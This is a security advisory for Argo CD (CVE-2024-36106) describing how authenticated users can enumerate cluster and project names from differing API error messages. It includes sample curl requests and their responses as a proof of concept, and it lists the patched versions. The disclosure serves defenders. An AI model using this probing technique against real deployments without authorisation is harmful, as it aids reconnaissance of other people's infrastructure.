# Authenticated users can enumerate clusters by name

- **GHSA:** [GHSA-3cqf-953p-h5cp](https://github.com/argoproj/argo-cd/security/advisories/GHSA-3cqf-953p-h5cp)
- **CVE:** CVE-2024-36106
- **Severity:** medium
- **Published:** 2024-06-06T09:54:43Z

## Description

### Impact
It’s possible for authenticated users to enumerate clusters by name by inspecting error messages:

```
$ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name' -H "Authorization: 
Bearer $token"
{"error":"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z","code":7,"message":"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z"}⏎                                 
                                   
$ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H "Authorizati
on: Bearer $token"
{"error":"permission denied","code":7,"message":"permission denied"}
```

It’s also possible to enumerate the names of projects with project-scoped clusters if you know the names of the clusters.
```
curl -k 'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name' -H "Authorization: Bearer $token"
{"error":"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z","code":7,"message":"permission denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z"}

curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H "Authorization: Bearer $token"
{"error":"permission denied","code":7,"message":"permission denied"}
```

### Patches
A patch for this vulnerability has been released in the following Argo CD versions:

v2.11.3
v2.10.12
v2.9.17

### For more information
If you have any questions or comments about this advisory:

Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

Credits
This vulnerability was found & reported by @crenshaw-dev (Michael Crenshaw)

The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue


## Affected Versions

| Package | Vulnerable Range | Patched |
|---------|-----------------|---------|
| github.com/argoproj/argo-cd | >0.11.0 | 2.11.3, 2.10.12, 2.9.17 |
